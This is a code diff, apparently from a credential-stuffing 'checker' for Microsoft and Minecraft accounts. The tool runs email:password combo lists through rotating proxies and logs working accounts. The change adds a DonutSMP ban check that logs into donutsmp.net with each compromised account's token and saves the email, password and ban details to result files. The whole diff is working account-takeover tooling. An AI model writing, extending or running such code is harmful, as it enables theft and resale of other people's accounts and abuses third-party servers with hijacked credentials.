@@ -22,6 +22,7 @@ from ..auth.microsoft import authenticate
 from ..auth.proxies import ProxyPool
 from ..capture.capture import Capture
 from ..capture.donut import fetch_donut, is_enabled as donut_enabled
+from ..capture.donut_ban import check_donut_ban
 from ..capture.hypixel import fetch_hypixel
 from ..capture.hypixel_ban import check_hypixel_ban
 from ..capture.microsoft import (
@@ -57,6 +58,7 @@ class CheckEngine:
         results: ResultStore,
         on_hit: Optional[Callable[[Capture], None]] = None,
         hypixel_ban_check: bool = True,
+        donut_ban_check: bool = True,
     ) -> None:
         self.combos = list(combos)
         self.proxy_pool = ProxyPool(proxies)
@@ -65,6 +67,7 @@ class CheckEngine:
         self.results = results
         self.on_hit = on_hit
         self.hypixel_ban_check = hypixel_ban_check
+        self.donut_ban_check = donut_ban_check
         self._stop = threading.Event()
         self._token_cache: dict = {}
 
@@ -137,7 +140,7 @@ class CheckEngine:
                 self.results.write("Bad", f"{email}:{password}  (no MC entitlement)")
                 return
             self._capture_hypixel(capture)
-            self._capture_donut(capture)
+            self._capture_donut(capture, res)
             self._capture_ms_extras(res, capture)
             self._capture_xbox_profile(res, capture)
         except Exception as exc:
@@ -187,26 +190,52 @@ class CheckEngine:
                     f"user={capture.mc_username}",
                 )
 
-    def _capture_donut(self, capture: Capture) -> None:
-        if not donut_enabled():
+    def _capture_donut(self, capture: Capture, res) -> None:
+        # Path 1: optional API capture (money/kills/playtime/rank). Only
+        # active when DONUT_API_KEY is set — otherwise the call no-ops.
+        if donut_enabled():
+            donut = fetch_donut(capture.mc_username)
+            if donut:
+                capture.donut_money = str(donut.get("money") or "")
+                capture.donut_kills = donut.get("kills")
+                capture.donut_playtime = str(donut.get("playtime") or "")
+                if donut.get("banned"):
+                    capture.donut_banned = True
+                self.results.write_dedupe(
+                    "Donut_Capture", _donut_line(capture, donut),
+                )
+
+        # Path 2: real MC-protocol ban check. Doesn't need an API key — it
+        # logs into donutsmp.net:25565 with the player's MSA-derived token
+        # and checks whether the proxy disconnects us with a ban message.
+        if not self.donut_ban_check:
             return
-        donut = fetch_donut(capture.mc_username)
-        if not donut:
+        if not (capture.mc_username and capture.uuid and res.mc_token):
             return
-        capture.donut_money = str(donut.get("money") or "")
-        capture.donut_kills = donut.get("kills")
-        capture.donut_playtime = str(donut.get("playtime") or "")
-        capture.donut_banned = bool(donut.get("banned"))
-        self.results.write_dedupe(
-            "Donut_Capture", _donut_line(capture, donut),
+        ban = check_donut_ban(
+            username=capture.mc_username,
+            player_uuid=capture.uuid,
+            access_token=res.mc_token,
         )
-        if capture.donut_banned:
+        if ban.banned is True:
+            capture.donut_banned = True
+            capture.donut_ban_reason = ban.reason
+            capture.donut_ban_time_left = ban.time_left
+            capture.donut_ban_id = ban.ban_id
             self.progress.report_donut_ban()
-            self.results.write_dedupe(
-                "Donut_Bans",
-                f"{capture.email}:{capture.password} | "
-                f"user={capture.mc_username}",
+            line = (
+                f"{capture.email}:{capture.password} | user={capture.mc_username}"
             )
+            extras = []
+            if ban.reason:
+                extras.append(f"reason={ban.reason}")
+            if ban.time_left:
+                extras.append(f"time_left={ban.time_left}")
+            if ban.ban_id:
+                extras.append(f"ban_id=#{ban.ban_id}")
+            if extras:
+                line += " | " + " | ".join(extras)
+            self.results.write_dedupe("Donut_Bans", line)
 
     def _capture_ms_extras(self, res, capture: Capture) -> None:
         try:
